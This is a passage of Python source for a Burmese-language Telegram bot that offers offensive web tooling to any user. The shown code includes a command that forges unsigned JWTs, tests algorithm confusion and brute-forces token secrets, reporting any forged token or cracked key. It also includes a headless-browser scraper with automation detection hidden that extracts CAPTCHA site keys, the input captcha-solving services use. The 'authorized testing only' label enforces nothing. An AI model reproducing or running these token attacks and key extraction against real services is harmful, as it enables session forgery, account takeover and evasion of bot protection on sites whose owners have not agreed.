            "💡 `/extract <url>` နဲ့ token ရှာပြီး ဒီမှာ paste ပါ",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    token = context.args[0].strip()

    # URL pass လုပ်မိရင် ကောင်းကောင်း error ပြ
    if token.startswith('http://') or token.startswith('https://'):
        await update.effective_message.reply_text(
            "❌ *URL မဟုတ်ဘဲ JWT Token ထည့်ပါ*\n\n"
            "JWT format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx`\n\n"
            "💡 Token ကိုရှာဖို့ `/extract <url>` သုံးနိုင်သည်",
            parse_mode='Markdown'
        )
        return

    # Basic JWT format check (3 parts, each part is base64url)
    if token.count('.') != 2:
        await update.effective_message.reply_text(
            "❌ Valid JWT မဟုတ်ပါ\n"
            "JWT format: `xxxxx.yyyyy.zzzzz` (dot 3 ပိုင်း ပါရမည်)",
            parse_mode='Markdown'
        )
        return

    parts = token.split('.')
    for i, part in enumerate(parts[:2]):
        if len(part) < 4:
            await update.effective_message.reply_text(
                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
                parse_mode='Markdown'
            )
            return

    msg = await update.effective_message.reply_text(
        "🎟️ *JWT Attacker Running...*\n\n"
        "① Decoding...\n② None attack...\n③ Alg confusion...\n④ Brute-forcing...\n⏳",
        parse_mode='Markdown'
    )

    # ── Phase 1: Decode ──────────────────────────
    decoded = _jwt_decode_payload(token)
    if "error" in decoded:
        await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
        return

    header  = decoded.get("header", {})
    payload = decoded.get("payload", {})
    alg     = header.get("alg", "unknown")

    # Format payload nicely
    def _fmt_payload(p: dict) -> str:
        lines = []
        important_keys = ['sub','iss','aud','exp','iat','nbf','role','roles',
                          'user_id','uid','email','username','admin','scope',
                          'permissions','type','jti']
        for k in important_keys:
            if k in p:
                v = p[k]
                if k in ('exp','iat','nbf') and isinstance(v, int):
                    try:
                        from datetime import datetime as _dt
                        v = f"{v} ({_dt.utcfromtimestamp(v).strftime('%Y-%m-%d %H:%M UTC')})"
                    except Exception:
                        pass
                lines.append(f"  `{k}`: `{str(v)[:80]}`")
        remaining = {k: v for k, v in p.items() if k not in important_keys}
        for k, v in list(remaining.items())[:10]:
            lines.append(f"  `{k}`: `{str(v)[:60]}`")
        return "\n".join(lines) or "  (empty)"

    payload_str = _fmt_payload(payload)

    # ── Phase 2: None attack ─────────────────────
    none_res = _jwt_none_attack(token)

    # ── Phase 3: Alg confusion ───────────────────
    alg_res = _jwt_alg_confusion(token)

    # ── Phase 4: Brute-force (in thread) ─────────
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🎟️ *JWT Attacker*\n\n🔑 {txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        bf_res = await asyncio.to_thread(
            _jwt_brute_force, token, None, lambda t: progress_q.append(t)
        )
    except Exception as e:
        bf_res = {"cracked": False, "error": str(e)}
    finally:
        prog.cancel()

    # ── Build report ─────────────────────────────
    lines = [
        "🎟️ *JWT Attack Report*",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        f"*① Decoded Token:*",
        f"  Algorithm: `{alg}`",
        f"  Header: `{json.dumps(header, separators=(',',':'))[:100]}`",
        f"",
        f"*📋 Payload:*",
        payload_str,
        "",
    ]

    # None attack result
    lines.append("*② None Algorithm Bypass:*")
    if none_res.get("success"):
        forged = none_res['forged_token']
        lines.append(f"  ✅ *VULNERABLE — unsigned token forged!*")
        lines.append(f"  Original alg: `{none_res['original_alg']}`")
        lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
        lines.append(f"  _{none_res.get('note','')}_")
    else:
        lines.append(f"  ⚪ Not applicable or failed")
    lines.append("")

    # Alg confusion result
    lines.append("*③ Algorithm Confusion:*")
    if alg_res.get("success"):
        lines.append(f"  🟠 RS256 → HS256 confusion possible!")
        lines.append(f"  _{alg_res.get('note','')[:150]}_")
    else:
        lines.append(f"  ⚪ {alg_res.get('note', 'Not applicable')}")
    lines.append("")

    # Brute-force result
    lines.append("*④ Secret Key Brute-force:*")
    if bf_res.get("cracked"):
        secret = bf_res['secret']
        lines.append(f"  🔴 *SECRET FOUND!*")
        lines.append(f"  Key: `{secret}`")
        lines.append(f"  Algorithm: `{bf_res.get('alg','?')}`")
        lines.append(f"  Tried: `{bf_res.get('tried',0)}` passwords")
    elif "error" in bf_res:
        lines.append(f"  ⚪ `{bf_res['error']}`")
    else:
        lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
        lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized security research only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # Export full JSON report
    import io
    full_report = {
        "token": token,
        "decoded": decoded,
        "none_attack": none_res,
        "alg_confusion": alg_res,
        "brute_force": bf_res,
        "analyzed_at": datetime.now().isoformat(),
    }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_buf = io.BytesIO(json.dumps(full_report, indent=2, default=str).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=report_buf,
            filename=f"jwt_report_{ts}.json",
            caption="🎟️ *JWT Full Report* — JSON export",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("JWT export error: %s", e)


# ══════════════════════════════════════════════════
# 🔑  FEATURE 13 — CAPTCHA Site Key Extractor (/sitekey)
#     reCAPTCHA v2/v3 · hCaptcha · Turnstile · FunCaptcha
#     Extracts: site_key, page_url, action, captcha_type
# ══════════════════════════════════════════════════

# ── Regex patterns per captcha type ─────────────
_CAPTCHA_PATTERNS = {

    # ─── reCAPTCHA v2 ────────────────────────────
    "reCAPTCHA v2": [
        # data-sitekey attribute
        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # grecaptcha.render
        re.compile(r'grecaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # siteKey / site_key object key
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        re.compile(r'["\']site_key["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        re.compile(r'siteKey\s*[=:]\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
    ],

    # ─── reCAPTCHA v3 ────────────────────────────
    "reCAPTCHA v3": [
        # grecaptcha.execute(key, {action:...})
        re.compile(r'grecaptcha\.execute\s*\(\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # grecaptcha.ready + execute in same script
        re.compile(r'execute\(["\']([6][A-Za-z0-9_\-]{39})["\']', re.I),
    ],

    # ─── hCaptcha ────────────────────────────────
    "hCaptcha": [
        re.compile(r'data-sitekey=["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
        re.compile(r'hcaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9a-f\-]{36})["\']', re.I),
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
    ],

    # ─── Cloudflare Turnstile ─────────────────────
    "Cloudflare Turnstile": [
        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\'].*?turnstile|turnstile.*?data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I | re.S),
        re.compile(r'turnstile\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # Turnstile keys start with 0x4A or 1x00
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
        re.compile(r'data-sitekey=["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
    ],

    # ─── FunCaptcha (Arkose Labs) ─────────────────
    "FunCaptcha": [
        re.compile(r'(?:public_key|data-pkey)\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
        re.compile(r'ArkoseEnforcement\s*\([^)]*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
    ],

    # ─── GeeTest ─────────────────────────────────
    "GeeTest": [
        re.compile(r'gt\s*[=:]\s*["\']([0-9a-f]{32})["\']', re.I),
        re.compile(r'["\']gt["\']\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
    ],

    # ─── AWS WAF Captcha ──────────────────────────
    "AWS WAF Captcha": [
        re.compile(r'AwsWafIntegration\.getToken\s*\(\s*["\']([^"\']{10,200})["\']', re.I),
        re.compile(r'jsapi\.token\s*[=:]\s*["\']([^"\']{10,200})["\']', re.I),
    ],
}

# ─── reCAPTCHA action pattern ────────────────────
_ACTION_PATTERNS = [
    re.compile(r'action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'["\']action["\']\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'grecaptcha\.execute\s*\([^,]+,\s*\{[^}]*action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
]

# ─── Script src patterns (detect captcha from includes) ─
_CAPTCHA_SCRIPT_SIGS = {
    "reCAPTCHA": ["google.com/recaptcha", "recaptcha/api.js", "recaptcha/enterprise.js"],
    "hCaptcha":  ["hcaptcha.com/1/api.js", "js.hcaptcha.com"],
    "Turnstile": ["challenges.cloudflare.com/turnstile"],
    "FunCaptcha": ["funcaptcha.com", "arkoselabs.com"],
    "GeeTest":   ["gt.captcha.com", "static.geetest.com"],
}


def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> list:
    """
    Extract all captcha site_key / action / page_url from HTML + JS.
    Returns list of finding dicts.
    """
    findings = []
    seen_keys = set()

    def _scan_text(text: str, source_label: str):
        for cap_type, patterns in _CAPTCHA_PATTERNS.items():
            for pat in patterns:
                for m in pat.finditer(text):
                    # Get first non-None group (handles alternation patterns)
                    if m.lastindex and m.lastindex >= 1:
                        key = next((g for g in m.groups() if g), None)
                    else:
                        try:
                            key = m.group(1)
                        except IndexError:
                            key = m.group(0)
                    if not key:
                        continue
                    key = key.strip()
                    if len(key) < 10:
                        continue
                    dedup = cap_type + ":" + key
                    if dedup in seen_keys:
                        continue
                    seen_keys.add(dedup)

                    # Extract action from surrounding context (±400 chars)
                    action = ""
                    ctx_start = max(0, m.start() - 400)
                    ctx_end   = min(len(text), m.end() + 400)
                    ctx       = text[ctx_start:ctx_end]
                    for ap in _ACTION_PATTERNS:
                        am = ap.search(ctx)
                        if am:
                            cand = am.group(1)
                            # Filter out false-positives (too generic)
                            if cand not in ('get','set','use','new','add','key','id'):
                                action = cand
                                break

                    findings.append({
                        "type":     cap_type,
                        "site_key": key,
                        "page_url": page_url,
                        "action":   action,
                        "source":   source_label,
                    })

    # Scan main HTML
    _scan_text(html, "HTML source")

    # Scan inline scripts separately for better context
    soup = BeautifulSoup(html, 'html.parser')
    for i, script in enumerate(soup.find_all('script')):
        if script.string and script.string.strip():
            _scan_text(script.string, f"Inline script #{i}")

    # Scan external JS sources if provided
    if js_sources:
        for js_url, js_text in js_sources.items():
            _scan_text(js_text, f"JS: {js_url[:60]}")

    # ─── Detect captcha type from script src (even without key) ──
    script_tags = [t.get('src', '') for t in soup.find_all('script', src=True)]
    detected_via_script = set()
    for src in script_tags:
        for cap_type, sigs in _CAPTCHA_SCRIPT_SIGS.items():
            if any(sig in src for sig in sigs):
                detected_via_script.add((cap_type, src))

    # Add script-detected types that have no key found yet
    found_types = {f["type"].split()[0] for f in findings}
    for cap_type, src in detected_via_script:
        short = cap_type.split()[0]
        if short not in found_types:
            findings.append({
                "type":     cap_type + " ⚠️ (key not found)",
                "site_key": "",
                "page_url": page_url,
                "action":   "",
                "source":   f"Script include: {src[:80]}",
            })

    return findings


def _sitekey_playwright(url: str, progress_cb=None) -> dict:
    """
    DevTools-style sitekey extraction using Playwright.
    Intercepts ALL network requests like Chrome DevTools → Network tab.
    Extracts sitekeys from:
      - Request URLs  (recaptcha/api2/anchor?k=SITEKEY)
      - POST bodies   (hcaptcha checksiteconfig)
      - Console logs  (window.console messages)
      - Final DOM     (data-sitekey attributes after JS execution)
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "playwright_not_installed", "findings": [], "page_url": url}

    findings     = []
    seen_keys    = set()
    network_log  = []   # all intercepted requests
    console_log  = []   # all console messages
    page_url_ref = [url]

    # ── Patterns to extract key from intercepted request URL ──
    _NET_PATTERNS = [
        # reCAPTCHA v2 / v3
        (re.compile(r'google\.com/recaptcha/api2/(?:anchor|bframe|reload)\?[^"\']*[?&]k=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v2"),
        (re.compile(r'google\.com/recaptcha/enterprise/(?:anchor|bframe|reload)\?[^"\']*[?&]k=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA Enterprise"),
        (re.compile(r'recaptcha/api\.js\?render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v3"),
        (re.compile(r'recaptcha/enterprise\.js\?render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA Enterprise"),
        # hCaptcha
        (re.compile(r'hcaptcha\.com/checksiteconfig\?[^"\']*sitekey=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I), "hCaptcha"),
        (re.compile(r'hcaptcha\.com/getcaptcha\?s=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I), "hCaptcha"),
        (re.compile(r'hcaptcha\.com/[^?]*\?[^"\']*sitekey=([0-9a-f\-]{36})', re.I), "hCaptcha"),
        # Cloudflare Turnstile
        (re.compile(r'challenges\.cloudflare\.com/turnstile/[^?]+\?[^"\']*sitekey=([0-9A-Za-z_\-]{20,60})', re.I), "Cloudflare Turnstile"),
        (re.compile(r'challenges\.cloudflare\.com/turnstile/v0/api\.js\?[^"\']*render=([0-9A-Za-z_\-]{20,60})', re.I), "Cloudflare Turnstile"),
        # FunCaptcha
        (re.compile(r'(?:funcaptcha\.com|arkoselabs\.com)[^"\']*pk=([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})', re.I), "FunCaptcha"),
    ]

    # ── POST body patterns ─────────────────────────
    _BODY_PATTERNS = [
        (re.compile(r'"sitekey"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "From POST body"),
        (re.compile(r'sitekey=([0-9A-Za-z_\-]{20,60})', re.I), "From POST body"),
        (re.compile(r'"k"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "From POST body"),
    ]

    def _add_finding(cap_type, key, source, page_url):
        dedup = cap_type + ":" + key
        if dedup not in seen_keys and len(key) >= 10:
            seen_keys.add(dedup)
            findings.append({
                "type":     cap_type,
                "site_key": key,
                "page_url": page_url,
                "action":   "",
                "source":   source,
            })

    def _scan_url(req_url: str, page_url: str):
        for pat, cap_type in _NET_PATTERNS:
            m = pat.search(req_url)
            if m:
                _add_finding(cap_type, m.group(1), f"Network request: {req_url[:100]}", page_url)

    def _scan_body(body: str, req_url: str, page_url: str):
        for pat, label in _BODY_PATTERNS:
            for m in pat.finditer(body):
                _add_finding("reCAPTCHA/hCaptcha (POST)", m.group(1),
                             f"{label} → {req_url[:80]}", page_url)

    with sync_playwright() as pw:
        if progress_cb: progress_cb("🌐 Launching headless browser...")

        browser = pw.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
            ]
        )
        context_pw = browser.new_context(
            user_agent=(
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/120.0.0.0 Safari/537.36'
            ),
            viewport={"width": 1280, "height": 720},
            ignore_https_errors=True,
        )
        page = context_pw.new_page()

        # ── Intercept every network request ────────
        def _on_request(request):
            req_url = request.url
            network_log.append(req_url)
            _scan_url(req_url, page_url_ref[0])
            # Also scan POST body
            try:
                body = request.post_data
                if body and len(body) > 5:
                    _scan_body(body, req_url, page_url_ref[0])
            except Exception:
                pass

        # ── Intercept responses for captcha API JSON ─
        def _on_response(response):
            resp_url = response.url
            try:
                if any(sig in resp_url for sig in [
                    'recaptcha', 'hcaptcha', 'turnstile', 'funcaptcha'
                ]):
                    body = response.body()
                    if body:
                        text = body.decode('utf-8', errors='ignore')
                        _scan_body(text, resp_url, page_url_ref[0])
            except Exception:
                pass

        # ── Capture console messages ────────────────
        def _on_console(msg):
            try:
                console_log.append(msg.text)
            except Exception:
                pass

        page.on("request",  _on_request)
        page.on("response", _on_response)
        page.on("console",  _on_console)

        if progress_cb: progress_cb("📡 Loading page & intercepting requests...")

        try:
            resp = page.goto(url, wait_until="networkidle", timeout=30_000)
            if resp:
                page_url_ref[0] = page.url
        except PWTimeout:
            # networkidle timeout — still extract what we got
            page_url_ref[0] = page.url
        except Exception as e:
            browser.close()
            return {"error": str(e), "findings": [], "page_url": url}

        # Extra wait for lazy-loaded captcha widgets
        try:
            page.wait_for_timeout(3000)
        except Exception:
            pass

        # ── Scroll to trigger lazy-load ─────────────
        try:
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
            page.wait_for_timeout(2000)
        except Exception:
            pass

        if progress_cb: progress_cb("🔍 Scanning final DOM + console logs...")

        # ── Scan final rendered HTML (post-JS) ──────
        try:
            final_html = page.content()
        except Exception:
            final_html = ""

        # ── Extract data-sitekey from DOM via evaluate ──
        try:
            dom_keys = page.evaluate("""() => {
                const results = [];
                // data-sitekey attributes
                document.querySelectorAll('[data-sitekey]').forEach(el => {
                    results.push({key: el.getAttribute('data-sitekey'), tag: el.tagName});
                });
                // grecaptcha object
                try {
                    if (window.grecaptcha && window.grecaptcha.enterprise) {
                        results.push({key: 'grecaptcha.enterprise detected', tag: 'JS'});
                    }
                } catch(e) {}
                return results;
            }""")
            for item in (dom_keys or []):
                key = (item.get("key") or "").strip()
                if key and len(key) >= 10:
                    # Determine type from key format
                    if re.match(r'[0-9a-f]{8}-[0-9a-f]{4}', key, re.I):
                        cap_type = "hCaptcha"
                    elif re.match(r'[01]x[0-9A-Fa-f]', key):
                        cap_type = "Cloudflare Turnstile"
                    else:
                        cap_type = "reCAPTCHA"
                    _add_finding(cap_type, key, f"DOM data-sitekey ({item.get('tag','')})", page_url_ref[0])
        except Exception:
            pass

        browser.close()

    # ── Also scan final HTML with existing extractor ─
    if final_html:
        js_sources_extra = {}
        existing = _extract_captcha_info(final_html, page_url_ref[0], js_sources_extra)
        for f in existing:
            dedup = f["type"] + ":" + f["site_key"]
            if dedup not in seen_keys and f["site_key"]:
                seen_keys.add(dedup)
                f["source"] = "Rendered HTML — " + f["source"]
                findings.append(f)

    # ── Scan console logs for leaked keys ───────────
    console_text = "\n".join(console_log)
    if console_text:
        for pat, cap_type in _CAPTCHA_PATTERNS.items():
            for p in _CAPTCHA_PATTERNS[pat] if isinstance(pat, str) else []:
                for m in p.finditer(console_text):
                    try:
                        key = m.group(1)
                        _add_finding(pat, key, "Console log", page_url_ref[0])
                    except Exception:
                        pass

    return {
        "findings":      findings,
        "page_url":      page_url_ref[0],
        "js_fetched":    len(network_log),   # total intercepted requests
        "network_log":   network_log[:50],   # first 50 for debug
        "error":         None,
    }


def _sitekey_sync(url: str, progress_cb=None) -> dict:
    """
    Try Playwright (DevTools-style) first.
    Falls back to requests-based static scan if Playwright not available.
    """
    # ── Try Playwright ─────────────────────────────
    result = _sitekey_playwright(url, progress_cb)
    if result.get("error") == "playwright_not_installed":
        if progress_cb: progress_cb("⚠️ Playwright မရှိ — static scan သို့ fallback...")
        return _sitekey_static(url, progress_cb)
    return result


def _sitekey_static(url: str, progress_cb=None) -> dict:
    """Fallback: requests-based static HTML + JS scan (no browser)."""
    session = requests.Session()
    session.headers.update(_get_headers())

    if progress_cb: progress_cb("⬇️ Fetching page HTML (static)...")
    try:
        resp = session.get(url, timeout=15, verify=False, allow_redirects=True)
        resp.raise_for_status()
        html     = resp.text
        page_url = resp.url
    except Exception as e:
        return {"error": str(e), "findings": [], "page_url": url}

    final_parsed = urlparse(page_url)
    base_origin  = f"{final_parsed.scheme}://{final_parsed.netloc}"

    def _resolve(src):
        if not src: return None
        src = src.strip()
        if src.startswith('//'): return final_parsed.scheme + ':' + src
        if src.startswith('http'): return src
        if src.startswith('/'): return base_origin + src
        base_path = final_parsed.path.rsplit('/', 1)[0]
        return f"{base_origin}{base_path}/{src}"

    soup = BeautifulSoup(html, 'html.parser')
    js_seen, js_ordered = set(), []

    def _add_js(u):
        if u and u.startswith('http') and u not in js_seen:
            js_seen.add(u); js_ordered.append(u)

    for tag in soup.find_all('script', src=True):
        _add_js(_resolve(tag['src']))

    captcha_sigs_flat = [s for sigs in _CAPTCHA_SCRIPT_SIGS.values() for s in sigs]
    def _prio(u):
        n = u.lower()
        if any(s in n for s in captcha_sigs_flat): return 0
        if any(k in n for k in ('main','app','index','chunk','bundle','vendor','runtime')): return 1
        return 2

    fetch_list = sorted(js_ordered, key=_prio)[:15]

    if progress_cb: progress_cb(f"📦 Fetching {len(fetch_list)} JS files...")
    js_sources = {}
    for js_url in fetch_list:
        try:
            r = session.get(js_url, timeout=10, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                js_sources[js_url] = r.text[:800_000]
        except Exception:
            pass

    if progress_cb: progress_cb(f"🔍 Scanning {len(js_sources)} JS files...")
    findings = _extract_captcha_info(html, page_url, js_sources)
    return {"findings": findings, "page_url": page_url, "js_fetched": len(js_sources), "error": None}


async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sitekey <url> — Extract reCAPTCHA/hCaptcha/Turnstile site_key, page_url, action"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/sitekey https://example.com`\n\n"
            "🔑 *Extracts:*\n"
            "  • `site_key` — Captcha public key\n"
            "  • `page_url` — Final URL (after redirects)\n"
            "  • `action`   — reCAPTCHA v3 action name\n\n"
            "🛡️ *Supported Captcha Types:*\n"
            "  • reCAPTCHA v2 _(data-sitekey / grecaptcha.render)_\n"
            "  • reCAPTCHA v3 _(grecaptcha.execute + action)_\n"
            "  • reCAPTCHA Enterprise\n"
            "  • hCaptcha _(UUID format key)_\n"
            "  • Cloudflare Turnstile _(0x4A... / 1x00...)_\n"
            "  • FunCaptcha / Arkose Labs\n"
            "  • GeeTest\n"
            "  • AWS WAF Captcha\n\n"
            "📦 HTML source + JS bundles ကို scan မည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔑 *Site Key Extractor*\n🌐 `{domain}`\n\n"
        "🌐 Launching headless browser...\n"
        "📡 Intercepting network requests...\n"
        "🔍 Scanning DOM + console logs...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔑 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except BadRequest:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _sitekey_sync, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("error"):
        await msg.edit_text(
            f"❌ *Fetch error*\n`{result['error']}`",
            parse_mode='Markdown'
        )
        return

    findings  = result["findings"]
    page_url  = result["page_url"]
    js_count  = result["js_fetched"]

    # ─── No captcha found ───────────────────────
    if not findings:
        await msg.edit_text(
            f"🔑 *Site Key Extractor — `{domain}`*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 *Captcha မတွေ့ပါ*\n\n"
            f"🌐 Page URL: `{page_url}`\n"
            f"📡 Requests intercepted: `{js_count}`\n\n"
            "_Network requests, DOM, console logs အကုန် scan ပြီးပါပြီ_\n"
            "_Site မှာ Captcha မပါ သို့မဟုတ် render ပြီးမှ load ဖြစ်နိုင်သည်_",
            parse_mode='Markdown'
        )
        return

    # ─── Build report ────────────────────────────
    lines = [
        f"🔑 *Site Key Extractor — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"🌐 Page URL: `{page_url}`",
        f"📡 Requests intercepted: `{js_count}`",
        f"✅ Found: `{len(findings)}` captcha instance(s)",
        "",
    ]

    # Type icons
    _TYPE_ICON = {
        "reCAPTCHA v2":          "🔵",
        "reCAPTCHA v3":          "🟣",
        "reCAPTCHA Enterprise":  "🟤",
        "hCaptcha":              "🟡",
        "Cloudflare Turnstile":  "🟠",
        "FunCaptcha":            "🔴",
        "GeeTest":               "🟢",
        "AWS WAF Captcha":       "⚪",
    }

    for i, f in enumerate(findings, 1):
        icon = next((v for k, v in _TYPE_ICON.items() if k in f["type"]), "🔑")
        lines.append(f"*{icon} [{i}] {f['type']}*")
        lines.append(f"  🔑 `site_key` : `{f['site_key'] or 'N/A'}`")
        lines.append(f"  🌐 `page_url`  : `{f['page_url']}`")
        if f["action"]:
            lines.append(f"  ⚡ `action`    : `{f['action']}`")
        lines.append(f"  📂 Source     : _{f['source'][:70]}_")
        lines.append("")

    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)

    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:8000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ─── Export JSON ─────────────────────────────
    import io as _io
    ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d    = re.sub(r'[^\w\-]', '_', domain)
    export    = {
        "domain":      domain,
        "page_url":    page_url,
        "scanned_at":  datetime.now().isoformat(),
        "js_scanned":  js_count,
        "findings": [
            {
                "type":     f["type"],
                "site_key": f["site_key"],
                "page_url": f["page_url"],
                "action":   f["action"],
                "source":   f["source"],
            }
            for f in findings
        ],
    }
    json_buf = _io.BytesIO(json.dumps(export, indent=2, ensure_ascii=False).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=json_buf,
            filename=f"sitekey_{safe_d}_{ts}.json",
            caption=(
                f"🔑 *Site Key Report — `{domain}`*\n"
                f"Found: `{len(findings)}` | JS: `{js_count}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("Sitekey export error: %s", e)


# ══════════════════════════════════════════════════
# 🤖  BOT — USER COMMANDS
# ══════════════════════════════════════════════════


async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mystats — Detailed personal statistics"""
    uid = update.effective_user.id
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)

    lim      = get_limit(db, u)
    dls      = u.get("downloads", [])
    total_mb = sum(d.get("size_mb", 0) for d in dls)
    success  = sum(1 for d in dls if d.get("status") == "success")
    failed   = len(dls) - success

    bar = pbar(u["count_today"], lim if lim > 0 else max(u["count_today"], 1))

    await update.effective_message.reply_text(
        "📊 *My Statistics*\n\n"
        "👤 *%s*\n"
        "🆔 `%d`\n\n"
        "📅 *Today:*\n"
        "`%s`\n"
        "Used: `%d` / `%s`\n\n"
        "📦 *All Time:*\n"
        "Downloads: `%d` total\n"
        "✅ Success: `%d`  ❌ Failed: `%d`\n"
        "💾 Data: `%.1f MB`" % (
            u["name"], uid,
            bar, u["count_today"], "∞" if lim == 0 else str(lim),
            u["total_downloads"], success, failed, total_mb,
        ),
        parse_mode="Markdown"
    )





async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    User က APK/IPA/ZIP/JAR upload လုပ်ရင် auto-detect ပြီး analyze လုပ်
    """
    doc = update.message.document
